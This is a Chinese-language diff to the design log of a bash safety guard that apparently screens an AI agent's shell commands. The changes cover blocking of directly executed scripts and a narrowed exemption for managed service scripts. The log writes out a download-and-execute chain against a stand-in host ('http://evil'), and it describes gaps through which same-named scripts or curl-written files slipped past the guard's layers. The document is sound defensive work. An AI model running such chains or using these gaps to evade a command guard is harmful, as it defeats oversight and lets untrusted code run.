@@ -321,7 +321,7 @@ zdebug 实证 12 条误伤的写目标全是 `{path:"/repo", via:"cmd-arg"}` 凭
 
 - guard-model-judge judgeBashFileScript 新增段首直执行位分支：词文本 `./x`、`/x` 排 `//` 与纯展开词收口的直执行位 → U5_BLOCK_MSG（文案括注扩「./file、/path/file 直接执行」）——「从文件读脚本执行，内容未经守卫逐条判定」语义同款适用，**U5 不看文件来历只看执行位**（造出来的与存量脚本一视同仁）——curl/cp 造+直执链生产层闭合（探针实测 prod:BLOCK）
 - **运行器族 carve**（isDirectExecScriptSeg 单接口，wv 三处 + U5 同源）：argv0 basename ∈ SHELL_INTERPRETERS∪{source,.}∪SCRIPT_RUNNERS（/usr/bin/python3 族）→ 脚本位在其参数/载荷，argv0 自身不当脚本——同时满足「绝对路径解释器不误拦」冻结契约（bash-safety-guard.test.ts [建议2] 例）与「同族不许自己打自己」裁决（本刀唯一放宽面：修正 delta4 把解释器绝对路径自身当脚本的误收）
-- **受管服务脚本族域分工 carve**（isManagedScriptWord：otter-buddy.sh/alpha.sh 词文本认领，含动态词原文）：该族已有拍板语义（SERVICE_SCRIPT 域路径限定+子命令限定 F20260916gsrd/gtlr；alpha.sh 为引导文案正道入口），不是不透明脚本，U5 直执分支不判——frozen 契约全保持（start/status/logs 放行、worktree 绝对路径脚本 stop 放行、`$(./scripts/otter-buddy.sh restart)` 仍走服务脚本文案）
+- **受管服务脚本族域分工 carve**（isManagedScriptWord）【delta7 收窄后口径——delta5 初版「词文本含族名即认领」不限路径不限子命令导致外溢，检视獭1360 delta6 严重 1，详见 delta7 节】：豁免条件=放行判定等价（单接口原则）——只在 SERVICE_SCRIPT 域实际接替判定的**受管路径**上豁免（scripts/ 相对形态、<root>/scripts/、worktree 树 scripts/，解析语义镜像 resolvesToMainCheckout），树外同名（/tmp/otter-buddy.sh 等）无域接替不豁免、进 U5 负门；frozen 契约全保持（start/status/logs 放行、worktree 绝对路径脚本 stop 放行、`$(./scripts/otter-buddy.sh restart)` 仍走服务脚本文案）
 - 生产层存在性盲与 bash x 完全同构：`bash x` 与 `./x` 同判（wv 三态看 fs/声明、prod 一律拦）——absent 形态「wv 放/prod 拦」即 bash x 现状的镜像，非新差异
 
 **严重 2 修法：isDirectExecArgv0 改检词文本（动态直执行位收口）**：
@@ -332,9 +332,29 @@ zdebug 实证 12 条误伤的写目标全是 `{path:"/repo", via:"cmd-arg"}` 凭
 **残余面更新（如实记档，不许失踪）**：
 
 - 动态直执不成 argv0 不收 → **delta5 已收口**（见严重 2）
-- **curl -o 造-执对同漏（wv 侧）维持记档**：链形态 `curl -o /tmp/y.sh http://evil && /tmp/y.sh` wv 侧仍走缺席证明放行（writerContent 只收重定向/echo/printf/cat/tee/heredoc，造-执对不识别 curl -o/cp 写通道）——**生产层已由 U5 扩面闭合**（拦截层闭合=攻击链实际拦断）；若要求 wv 侧也转 fail-closed，是造-执对收编 cp/curl -o 的独立工单（`>>` 同款「内容不可知→dynamic→fail-closed」机制已存在——探针实测 `>>` 链 wv:BLOCK/fail-closed/script-payload-dynamic），口径呈拍板，不并入本刀（工单面「只这两块面」）
+- **curl -o 造-执对同漏（wv 侧）维持记档**：链形态 `curl -o /tmp/y.sh http://evil && /tmp/y.sh` wv 侧仍走缺席证明放行（writerContent 只收重定向/echo/printf/cat/tee/heredoc，造-执对不识别 curl -o/cp 写通道）——**生产层已由 U5 扩面闭合**（拦截层闭合=攻击链实际拦断）；**wv 侧未闭合，待 M-026d87ff 收编**（大獭 delta5 裁决立案：『wv 造-执对收编：writerContent 扩至 cp/curl -o』，#1466 合入后独立工单，验收必带 corpus 守恒 + judge 考试零扰动；`>>` 同款「内容不可知→dynamic→fail-closed」机制已存在——探针实测 `>>` 链 wv:BLOCK/fail-closed/script-payload-dynamic）
 - EXEC_FACE 与 dotExec SQL 豁免口径分裂随 M-bf4049a3 不变
 
 **影响范围**：write-target-evaluator.ts（isDirectExecArgv0 词文本化+导出、isRunnerArgv0/isDirectExecScriptSeg 单接口、shellScriptFileArg/hasOpaqueScriptExec/牙1 三处同源）、guard-model-judge.ts（U5 直执分支 + isManagedScriptWord 域分工 + 文案括注）、单测 +16（wv 7 + prod 9，双向钉死：动态四形态/真存在直执/造+直执链拦截侧 + absent/运行器 carve/受管族/能力 8/foo$BAR 残余/裸命令名对照放行侧）；语义收敛面=「直执行位不透明执行」从两层放行转拦/fail-closed，唯一放宽面=解释器绝对路径 argv0（delta4 误收修正，frozen 契约要求）。
 
 **验证（delta5 轮）**：全仓 5562/5562 绿（364 文件；基线 5546 + 新增 16 = 5562 零回归）；write-target-evaluator.test.ts 114→121 例、bash-safety-guard.test.ts delta5 describe 新增 9 例；judge 考试 795/82/105 全过、棘轮零新键、corpus 守恒 921 恒等；探针复测（delta5-probe11/12 命令集）：单段真存在直执、动态四形态、`bash $P` 对照、curl/cp 造+直执链 **prod 全 BLOCK**；能力 8 cmdsub/import 两形态不误伤（wv 全绿）；真不存在 absent wv 放行、受管服务脚本族 frozen 全保持。
+
+### delta7 复核补刀（受管族 carve 收窄——「豁免条件=放行判定等价」，2026-10-14）
+
+检视獭1360 delta6 复核 1 严重（carve 外溢——同名文件双层全绕）+ 1 建议（M-026d87ff 锚点），大獭裁决严重全采纳、维持定级，并把**「豁免条件 = 放行判定等价」立为单接口原则**。delta5 的 carve「词文本含族名即认领」不限路径不限子命令——SERVICE_SCRIPT 域路径限定不认树外同名，**U5 豁免了但无域接替**：`/tmp/otter-buddy.sh`、`/tmp/alpha.sh`、`./otter-buddy.sh`、造-执链同名四形态双层全绕（「修复引入新盲区」活例）。
+
+**修法：isManagedScriptWord 收窄为路径限定豁免（一条语义一个接口）**：
+
+- 豁免面 = SERVICE_SCRIPT 域实际接替判定的受管路径：① scripts/ 相对形态 ② <root>/scripts/ ③ <root>/.otter/worktrees/<name>/scripts/（解析语义镜像 resolvesToMainCheckout（F20260916gtlr）：相对路径基于 projectRoot resolve、大小写归一化，改动需同步；projectRoot 缺失时降级文本判——相对形态 ∨ worktree 树形态，树外 scripts/ 不豁免）
+- 树外同名（/tmp/otter-buddy.sh、./otter-buddy.sh、/tmp/scripts/…）无域接替 → 不豁免，进 U5 直执分支（负门钉死；双层语义：wv 三态真存在→unreadable fail-closed、prod → U5 拦）
+- 子命令语义不重复实现（一条语义一个接口）：stop/restart/间接调用/kill 族判定归 SERVICE_SCRIPT 域与 kill 族规则族——若把子命令条件加进豁免会误伤 frozen kill 族判定（`./scripts/otter-buddy.sh restart2>&1` 形态经 kill 族拦，实测教训），故豁免只做路径限定（域接替的前提）
+- **单接口原则落档（大獭 delta6 裁决）**：豁免面不得宽于专属域的判定面——U5 豁免的前提是该段确实由专属域接替判定，无域接替即不得豁免；收窄是双向约束（不外溢且不误收）
+
+**记档改齐（delta6 建议 1 + 加重情节纠正）**：
+
+- curl-o 造-执对残余面补锚点：**wv 侧未闭合，待 M-026d87ff 收编**（见 delta5 节残余面行，已改）
+- delta5 节「受管服务脚本族域分工 carve」段已改齐为本节收窄口径——原文「词文本含族名即认领…以其专属规则域为准」与实现不符（记档说一套代码做一套，delta6 加重情节），已纠正
+
+**影响范围**：guard-model-judge.ts（isManagedScriptWord/isManagedScriptPath 路径限定收窄、checkWithModel/judgeBashFileScript 穿 projectRoot）、bash-safety-guard.ts（checkWithModel 调用点穿 projectRoot）、特性文档两处改齐 + 本节；单测 +7（prod 6：树外同名三形态负门 + 造-执链负门 + 树外 scripts/ 双形态负门 + frozen 双向保持两组 + 解释器不回退钉；wv 1：同名真存在负门）。
+
+**验证（delta7 轮）**：全仓 5569/5569 绿（364 文件；基线 5562 + 新增 7 = 5569 零回归）；tsc 全量 clean；frozen 双向保持独立复跑（受管路径放行面 start/status/logs/worktree stop/alpha start 全保绿 + 拦截面专属域文案全保持）；delta6 负门四形态全 BLOCK（prod U5 文案 + wv 三态）；delta6 已验面不回退（/usr/bin/python3 族只读不误拦钉死）。
